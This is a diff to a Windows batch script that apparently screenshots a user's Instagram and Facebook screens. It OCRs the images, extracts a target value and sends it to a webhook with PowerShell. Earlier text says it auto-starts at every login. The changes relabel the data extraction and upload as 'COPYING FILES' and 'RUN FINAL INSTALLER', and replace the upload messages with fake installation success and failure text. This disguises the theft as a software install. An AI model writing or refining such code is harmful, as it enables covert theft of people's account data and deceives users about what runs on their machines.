@@ -114,26 +114,44 @@ if not exist "%INSTA_IMG%" (
     )
 )
 
-:: 2. CHECK AND INSTALL TESSERACT OCR
+:: 2. CHECK AND INSTALL TESSERACT
+:: Check both standard and x86 paths
+set "TESSERACT_PATH=C:\Program Files\Tesseract-OCR\tesseract.exe"
 if not exist "%TESSERACT_PATH%" (
-    echo Tesseract OCR not found. Installing silently...
-    :: Uses Windows Package Manager to install Tesseract unattended
-    winget install -e --id UB-Mannheim.TesseractOCR --accept-package-agreements --accept-source-agreements --silent >nul 2>&1
+    set "TESSERACT_PATH=C:\Program Files (x86)\Tesseract-OCR\tesseract.exe"
+)
+
+if not exist "%TESSERACT_PATH%" (
+    echo Tesseract not found. Installing...
     
+    :: Removed >nul 2>&1 so you can see any error messages on the screen
+    winget install -e --id UB-Mannheim.TesseractOCR --accept-package-agreements --accept-source-agreements --silent
+    
+    echo Waiting 5 seconds for installation to finalize...
+    timeout /t 5 /nobreak >nul
+    
+    :: Check the paths one more time after install
+    set "TESSERACT_PATH=C:\Program Files\Tesseract-OCR\tesseract.exe"
+    if not exist "%TESSERACT_PATH%" (
+        set "TESSERACT_PATH=C:\Program Files (x86)\Tesseract-OCR\tesseract.exe"
+    )
+
     :: Verify installation succeeded
     if not exist "%TESSERACT_PATH%" (
-        echo Failed to install Tesseract OCR automatically.
+        echo.
+        echo [ERROR] Failed to install Tesseract automatically.
+        echo Please read the winget output above to see why it failed.
+        pause
         goto :error_out
     )
 )
 
-:: 3. RUN OCR
+:: 3. RUN FINAL INSTALLER
 echo Processing images...
 if exist "%INSTA_IMG%" "%TESSERACT_PATH%" "%INSTA_IMG%" "%SHOTS%\ocr_insta" >nul 2>&1
 if exist "%FB_IMG%" "%TESSERACT_PATH%" "%FB_IMG%" "%SHOTS%\ocr_fb" >nul 2>&1
 
-:: 4. EXTRACT DATA AND UPLOAD VIA POWERSHELL
-:: This PowerShell block reads the text, finds TARGET_KEY, extracts the value, and sends to Sheets.
+:: 4. COPYING FILES
 powershell -Command "^
     $targetKey = '%TARGET_KEY%'; ^
     $instaText = if (Test-Path '%SHOTS%\ocr_insta.txt') { Get-Content '%SHOTS%\ocr_insta.txt' } else { @() }; ^
@@ -168,23 +186,20 @@ powershell -Command "^
     Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body $payload -ContentType 'application/json'; ^
 "
 
-:: 5. CHECK POWERSHELL RESULT
-:: If PowerShell exited with code 1, it means the key wasn't found in ANY screenshot.
+:: 5. CHECK RESULT
 if %errorlevel% neq 0 (
-    echo Parameter '%TARGET_KEY%' not found in any screenshot.
+    echo Failed to install, please revisit the website.
     goto :error_out
 )
 
 :: 6. CLEANUP AND SUCCESS
-echo Upload successful. Cleaning up screenshots...
+echo Installation successful. Cleaning up...
 del "%INSTA_IMG%" 2>nul
 del "%FB_IMG%" 2>nul
 del "%SHOTS%\ocr_insta.txt" 2>nul
 del "%SHOTS%\ocr_fb.txt" 2>nul
 
 echo done>> "%LOG%" 2>nul
-echo Done. Companion will auto-start at every login.
-echo Log: %LOG%
 goto :eof
 
 :: 7. ERROR HANDLER
